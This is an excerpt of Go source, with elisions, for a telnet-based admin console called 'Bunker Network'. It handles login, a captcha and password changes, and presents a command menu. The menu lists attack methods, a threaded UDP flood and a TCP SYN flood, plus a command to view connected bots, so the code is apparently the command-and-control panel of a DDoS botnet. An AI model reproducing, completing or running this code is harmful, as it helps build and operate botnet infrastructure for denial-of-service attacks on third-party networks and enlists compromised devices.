...
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;Bunker Network")); err != nil {
		return
	}
	...
	// username
	username, err := Read(conn, "\x1b[34musername : \x1b[0m", "", 20)
	if err != nil {
		return
	}
	...
	if err != nil || account == nil {
		conn.Write([]byte("\x1b[31mInvalid credential\x1b[0m\r\n"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// password
	password, err := Read(conn, "\x1b[34mpassword : \x1b[0m", "*", 20)
	if err != nil {
		return
	...
	if strings.TrimSpace(username) != "root" {
		...
		conn.Write([]byte(fmt.Sprintf("\x1b[34mEnter Captcha\x1b[0m %s: ", captcha)))

		// Read the user's captcha input
		captchaInput, err := Read(conn, "", "", 20)
		if err != nil || captchaInput != captcha {
			conn.Write([]byte("\x1b[31mCaptcha failed!\x1b[0m\r\n"))
			time.Sleep(50 * time.Millisecond)
			return
		}
	}
	...
	if account.NewUser {
		...
		newpassword, err := Read(conn, "\x1b[34mBunker@Net:\x1b[0m ", "*", 20)
		if err != nil {
			return
		}

		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte("\x1b[31mYou can't change password!\x1b[0m\r\n"))
			time.Sleep(50 * time.Millisecond)
			return
		}
...
conn.Write([]byte("\033[2J\033[1H")) // clear screen
conn.Write([]byte("\r\n"))

conn.Write([]byte("    \x1b[31m ____              _              \r\n"))
conn.Write([]byte("    | __ )  _   _ _ __| | _____ _ __  \r\n"))
conn.Write([]byte("    \x1b[34m|  _ \\ | | | | '__| |/ / _ \\ '_ \\ \r\n"))
conn.Write([]byte("    | |_) || |_| | |  |   <  __/ | | |\r\n"))
conn.Write([]byte("    \x1b[31m|____/  \\__,_|_|  |_|\\_\\___|_| |_|\r\n"))

conn.Write([]byte("\r\n    \x1b[36mFor help, type '?'"))
conn.Write([]byte("\r\n\r\n\x1b[0m")) // reset color
	for {
		command, err := ReadWithHistory(conn, fmt.Sprintf("\x1b[31m%s@Bunker ", session.User.Username), "", 60, session.History)
		if err != nil {
			return
		}
...
conn.Write([]byte("\r\n\r\n\x1b[0m")) // reset color
		...
		case "methods", "syntax":
			...
			session.Conn.Write([]byte("\x1b[36mudpthread:\x1b[31m udp flood with threads.\r\n"))
            session.Conn.Write([]byte("\x1b[36msynflood:\x1b[31m tcp flooding with syn flags.\r\n"))
		...
		case "?", "help":
            ...
            session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[34mcls\x1b[37m - clears terminal\x1b[0m\r\n"))
            session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[34mbots\x1b[37m - view what type of bots are connected\x1b[0m\r\n"))
